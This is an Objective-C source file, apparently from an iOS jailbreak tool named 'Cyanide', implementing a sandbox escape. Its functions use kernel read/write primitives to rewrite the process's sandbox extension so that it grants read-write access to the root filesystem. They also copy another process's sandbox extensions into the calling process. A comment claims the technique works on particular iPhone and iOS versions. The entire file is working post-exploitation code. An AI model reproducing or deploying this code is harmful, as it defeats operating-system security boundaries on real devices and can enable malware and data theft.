//
//  sandbox.m
//  Cyanide
//
//  Created by seo on 4/6/26.
//

#import <Foundation/Foundation.h>
#import <sys/mount.h>
#import <sys/stat.h>

#import "sandbox.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/krw.h"
#import "../kexploit/kutils.h"
#import "../kexploit/vnode.h"
#import "../kexploit/offsets.h"
#import "../research/sandbox_research.h"
#import "../kexploit/kexploit_opa334.h"


// The original idea is from https://x.com/CrazyMind90/status/2040484080622465056
// Kudos to CrazyMind90 for revealing new sbx escape technique!
// This is almost same behavior with sandbox_extension_consume with r/w on root
// Confirmed works on iPhone 14 Pro/17.2.1, iPhone SE3/26.0
int patch_sandbox_ext(void) {
    uint64_t label = proc_get_cred_label(proc_self());
    uint64_t sbx = label_get_sandbox(label);
    struct sandbox_label sbx_lbl = {0};
    kreadbuf(sbx, &sbx_lbl, sizeof(struct sandbox_label));
    uint64_t ext_set_kptr = (uint64_t)sbx_lbl.extension_set;
    
    struct extension_set ext_set = {0};
    kreadbuf(ext_set_kptr, &ext_set, sizeof(struct extension_set));
    for(int i = 0; i < 9; i++) {
        uint64_t ext_class_node_kptr = (uint64_t)ext_set.type_buckets[i];
        if(ext_class_node_kptr != 0) {
            struct extension_class_node ext_class_node = {0};
            kreadbuf(ext_class_node_kptr, &ext_class_node, sizeof(ext_class_node));
            
            char name[256] = {0};
            kreadbuf((uint64_t)ext_class_node.class_name, name, 256-1);
            
            if (strstr(name, "com.apple.sandbox.container") == NULL) {
                continue;
            }
            
            uint64_t ext_kptr = (uint64_t)ext_class_node.ext_list_head;
            if (!ext_kptr) continue;
            
            struct extension ext = {0};
            kreadbuf(ext_kptr, &ext, sizeof(ext));
            uint64_t path_buf = (uint64_t)ext.data_ptr;
            
            uint8_t root_path[] = { '/', '\0' };
            kwritebuf(path_buf, root_path, 2);
            
            const char *new_class = "com.apple.app-sandbox.read-write";
            kwritebuf(path_buf + 2, (void *)new_class, strlen(new_class) + 1);
            
            uint8_t cn_buf[0x20];
            kreadbuf(ext_class_node_kptr, cn_buf, 0x20);
            *(uint64_t *)(cn_buf + offsetof(struct extension_class_node, class_name)) = path_buf + 2;
            kwrite_zone_element(ext_class_node_kptr, cn_buf, 0x20);
            
            kwrite64(ext_kptr + offsetof(struct extension, path_len), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.consumed), 1);
            kwrite8(ext_kptr + offsetof(struct extension, file.storage_class), SC_ISSUED);
            
            struct stat st;
            stat("/", &st);
            kwrite32(ext_kptr + offsetof(struct extension, file.st_dev), (uint32_t)st.st_dev);
            kwrite64(ext_kptr + offsetof(struct extension, st_ino), (uint64_t)st.st_ino);
            
            kwrite64(ext_set_kptr + offsetof(struct extension_set, type_buckets[0]), ext_class_node_kptr);
            
            if(check_sandbox_var_rw() == -1)    return -1;

            return 0;
        }
    }
    
    return -1;
}

int check_sandbox_var_rw(void) {
    pid_t pid = getpid();
    int r = sandbox_check(pid, "file-read-data",  SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    int w = sandbox_check(pid, "file-write-data", SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/private/var");
    return (r == 0 && w == 0) ? 0 : -1;
}

int borrow_sandbox_ext(const char* process) {
    //
    uint64_t self_label = proc_get_cred_label(proc_self());
    uint64_t self_sbx = label_get_sandbox(self_label);
    
    struct sandbox_label self_sbx_lbl = {0};
    kreadbuf(self_sbx, &self_sbx_lbl, sizeof(struct sandbox_label));
    uint64_t self_ext_set_kptr = (uint64_t)self_sbx_lbl.extension_set;
    printf("self_sbx_lbl->ext_set = 0x%llx\n", self_ext_set_kptr);

    uint64_t victim_label = proc_get_cred_label(proc_find_by_name(process));
    uint64_t victim_sbx = label_get_sandbox(victim_label);
    
    struct sandbox_label victim_sbx_lbl = {0};
    kreadbuf(victim_sbx, &victim_sbx_lbl, sizeof(struct sandbox_label));
    uint64_t victim_ext_set_kptr = (uint64_t)victim_sbx_lbl.extension_set;
    printf("victim_sbx_lbl->ext_set = 0x%llx\n", victim_ext_set_kptr);
    
    
    struct extension_set self_ext_set = {0};
    kreadbuf(self_ext_set_kptr, &self_ext_set, sizeof(struct extension_set));
    struct extension_set victim_ext_set = {0};
    kreadbuf(victim_ext_set_kptr, &victim_ext_set, sizeof(struct extension_set));
    
    for(int i = 0; i < 9; i++) {
        uint64_t what = kread64(victim_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]));
        kwrite64(self_ext_set_kptr + offsetof(struct extension_set, type_buckets[i]), what);
    }
    
    return 0;
}
